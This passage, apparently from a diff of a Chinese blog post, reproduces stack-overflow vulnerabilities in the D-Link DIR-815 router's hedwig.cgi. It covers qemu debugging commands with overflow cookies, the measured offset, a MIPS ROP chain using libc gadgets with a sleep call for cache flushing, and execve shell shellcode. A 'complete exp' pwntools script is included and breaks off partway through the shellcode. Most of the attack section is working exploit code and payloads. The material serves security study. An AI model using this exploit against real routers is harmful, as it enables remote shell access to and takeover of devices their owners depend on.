+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span><span class="token punctuation">;</span>
+LAB_00407ec4<span class="token punctuation">:</span>
+  iVar4 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+LAB_00407e40<span class="token punctuation">:</span>
+    pcVar6 <span class="token operator">=</span> sobj_get_string<span class="token punctuation">;</span>
+    pcVar3_cookie <span class="token operator">=</span> pcVar2<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> LAB_00407e48<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">goto</span> LAB_00407ee0<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>没有发现有什么漏洞点。我们再找找调用这个函数的位置，发现在hedwigcgi_main函数中有该函数的调用：</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/3.png"></div>
+我们看到在后面的sprintf造成了栈溢出漏洞。
+
+<p>实际上这里还有一个栈溢出漏洞:</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/4.png"></div>
+
+<p>由于没有size限制就可以无限格式化一个长字符串导致溢出，正常情况一般都会使用snprintf函数来完成指定一个size。</p>
+<p><strong>POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi</strong></p>
+<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><h2 id="先看看偏移"><a href="#先看看偏移" class="headerlink" title="先看看偏移"></a>先看看偏移</h2><p>命令：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mipsel-static -E CONTENT_LENGTH<span class="token operator">=</span>20 -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span>`python -c <span class="token string">"print 'uid=123'+'A'*0x600"</span>` -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"0.0.0.0"</span> -g 23946 ./htdocs/web/hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>貌似是执行一次post请求？</p>
+<div style="width:70%;margin:auto">{% asset_img 5.png %}</div>
+我们已经看到已经成功控制了返回地址。
+
+<div style="width:70%;margin:auto">{% asset_img 6.png %}</div>
+
+<p>我们看到栈溢出已经成功了，我们看看栈溢出的长度</p>
+<pre class="line-numbers language-bash"><code class="language-bash">
+<span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mipsel-static -E CONTENT_LENGTH<span class="token operator">=</span>20 -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span>`python -c <span class="token string">"print 'uid=123'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat'"</span>` -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"0.0.0.0"</span> -g 23946 ./htdocs/web/hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/7.png"></div>
+
+<p>溢出长度为1040字节</p>
+<p>在这之前我们需要看看其各段信息，我们发现gdb中vmmap指令不管用，于是通过proc中进程信息来查看：<br>这里明明是32位程序却打印出了64位内存布局……</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/8.png"></div>
+
+<p>先利用参考资料中：libc 的基地址 0x76738000</p>
+<p>通过加载的这个libc来找gadgets</p>
+<h2 id="调试优化"><a href="#调试优化" class="headerlink" title="调试优化"></a>调试优化</h2><p>调试脚本test.sh</p>
+<p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#/bin/bash</span>
+test<span class="token operator">=</span><span class="token punctuation">$(</span>python -c <span class="token string">"print 'uid='+open('test','r').read(2000)"</span><span class="token punctuation">)</span>LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$test</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span>PORT<span class="token operator">=</span><span class="token string">"23957"</span>
+<span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-mipsel-static<span class="token variable">)</span></span> ./qemu
+<span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span><span class="token variable">$test</span> -E REQUEST_URL<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"127.0.0.1"</span> -g <span class="token variable">$PORT</span> /htdocs/web/hedwig.cgi 2<span class="token operator">></span>/dev/null
+<span class="token function">rm</span> -f ./qemu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。patternLocOffset.py是一个已实现的小工具。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python patternLocOffset.py -c -l 2000 -f <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>重新触发两个栈溢出：</p>
+<p><strong>第一个栈溢出</strong>：</p>
+<p>test脚本：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#/bin/bash</span>
+test<span class="token operator">=</span><span class="token punctuation">$(</span>python -c <span class="token string">"print 'uid='+open('test','r').read(2000)"</span><span class="token punctuation">)</span>
+LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$test</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span>
+PORT<span class="token operator">=</span><span class="token string">"23957"</span>
+<span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mipsel-static -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span><span class="token variable">$test</span> -E REQUEST_URL<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"127.0.0.1"</span> -g <span class="token variable">$PORT</span> /htdocs/web/hedwig.cgi 2<span class="token operator">></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>生成payload文件test：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python patternLocOffset.py -c -l 2000 -f <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div style="width:70%;margin:auto">{% asset_img 9.png %}</div>
+
+<p><strong>第二个栈溢出</strong>：</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token comment" spellcheck="true">#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</span>
+
+INPUT<span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>
+COOKIE<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>
+PORT<span class="token operator">=</span><span class="token string">"23957"</span>
+LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span>
+<span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-mipsel-static<span class="token variable">)</span></span> ./qemu
+
+<span class="token keyword">echo</span> <span class="token variable">$INPUT</span> <span class="token operator">|</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span><span class="token variable">$COOKIE</span> -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>  -g <span class="token variable">$PORT</span> /htdocs/web/hedwig.cgi
+<span class="token function">rm</span> -f ./qemu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行命令</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> ./test.sh  <span class="token string">"uid=1234"</span>  `python -c <span class="token string">"print 'uid=' + open('test','r').read()"</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第二个栈溢出好像触发不了…</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>通过两个方式来getshell</p>
+<h2 id="exp1-shellcode"><a href="#exp1-shellcode" class="headerlink" title="exp1 shellcode"></a>exp1 shellcode</h2><p>有一个常规的rop链：执行的整体流程为 sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)</p>
+<p>这里详细讲讲为什么要执行sleep(1)：</p>
+<p>MIPS CPUs有两个独立的cache：指令cache和数据cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。</p>
+<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。</p>
+<p><strong>简单的来说就是可能shellcode并没有写进去，导致执行未知数据的问题</strong></p>
+<p>我们在IDA 7.0下使用mipsrop：</p>
+<p><strong>mipsrop.find(“li $a0,1”)</strong></p>
+<div style="width:70%;margin:auto">{% asset_img 10.png %}</div>
+<div style="width:70%;margin:auto">{% asset_img 11.png %}</div>
+
+<p>mipsrop.tail()：该指令作用是打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
+<p>0x57e50处将跳转到寄存器t9中的值，而t9寄存器时通过s1寄存器来传值的。</p>
+<div style="width:70%;margin:auto">{% asset_img 12.png %}</div>
+
+<p>此时payload：</p>
+<pre class="line-numbers language-python"><code class="language-python">base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
+rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> 
+<span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span>
+<span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E538 jr     </span>
+
+payload <span class="token operator">=</span> <span class="token string">"uid="</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">973</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> rop1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">28</span> <span class="token comment" spellcheck="true"># s2~s7 fp</span>
+rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span>
+<span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span>
+<span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>填充ra寄存器：</p>
+<p>0003E528 lw      $ra, 0x28+var_4( $sp)</p>
+<p>sp 和 ra 寄存器的距离为 0x24，所以这里的填充为 0x24，后面的四个字节就是 ra 寄存器的值</p>
+<p>那么这样的话s2填充为sleep函数地址，ra则为下一个gadget地址，这样可以执行完sleep(1)函数后执行gadgets。sleep函数通过在IDA里面查看得知偏移是0x56bd0</p>
+<p>payload更新：</p>
+<pre class="line-numbers language-python"><code class="language-python">base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
+rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> 
+<span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span>
+<span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E538 jr     </span>
+
+payload <span class="token operator">=</span> <span class="token string">"uid="</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">973</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> rop1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>sleep_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># s3~s7 fp</span>
+rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span>
+<span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span>
+<span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>利用mipsrop.stackfinder()找gadgets，也就是赋值完stack后又jmp到一个gadgets。（因为s1可控）</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/13.png"></div>
+
+<p>最后再寻找mipsrop.find(“mov $t9,$a1”)找到可以跳到a1寄存器的指令</p>
+<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/14.png"></div>
+
+<p>调用shellcode的payload</p>
+<pre class="line-numbers language-python"><code class="language-python">rop3 <span class="token operator">=</span> <span class="token number">0xb814</span>
+
+<span class="token comment" spellcheck="true"># .text:0000B814 addiu   $a1, $sp, 0x168+var_150</span>
+<span class="token comment" spellcheck="true"># .text:0000B818 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true"># .text:0000B81C jalr    $t9 ; st</span>
+
+rop4 <span class="token operator">=</span> <span class="token number">0x37e6c</span>
+
+<span class="token comment" spellcheck="true"># .text:00037E6C move    $t9, $a1</span>
+<span class="token comment" spellcheck="true"># .text:00037E70 addiu   $a0, 0x4C  # 'L'</span>
+<span class="token comment" spellcheck="true"># .text:00037E74 jr      $t</span>
+
+payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x1c</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>rop4<span class="token operator">+</span>base_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s1</span>
+payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>     <span class="token comment" spellcheck="true"># s2</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ra</span>
+
+shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>
+payload<span class="token operator">+=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token number">0x18</span>
+payload<span class="token operator">+=</span> shellcode
+
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>完整exp</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">"little"</span>
+context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"mips"</span>
+base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
+sleep_addr <span class="token operator">=</span> <span class="token number">0x56bd0</span>
+system_addr <span class="token operator">=</span> <span class="token number">0x53200</span>
+rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> 
+<span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span>
+<span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span>
+<span class="token comment" spellcheck="true">#.text:0003E538 jr    </span>
+
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x3cb</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> rop1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>sleep_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2</span>
+payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># s3~s7 fp</span>
+rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span>
+<span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span>
+<span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop2<span class="token punctuation">)</span>
+
+rop3 <span class="token operator">=</span> <span class="token number">0xb814</span>
+
+<span class="token comment" spellcheck="true"># .text:0000B814 addiu   $a1, $sp, 0x168+var_150</span>
+<span class="token comment" spellcheck="true"># .text:0000B818 move    $t9, $s1</span>
+<span class="token comment" spellcheck="true"># .text:0000B81C jalr    $t9 ; st</span>
+
+rop4 <span class="token operator">=</span> <span class="token number">0x37e6c</span>
+
+<span class="token comment" spellcheck="true"># .text:00037E6C move    $t9, $a1</span>
+<span class="token comment" spellcheck="true"># .text:00037E70 addiu   $a0, 0x4C  # 'L'</span>
+<span class="token comment" spellcheck="true"># .text:00037E74 jr      $t</span>
+
+payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x1c</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>rop4<span class="token operator">+</span>base_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s1</span>
+payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>     <span class="token comment" spellcheck="true"># s2</span>
+payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ra</span>
+
+shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>
+shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>
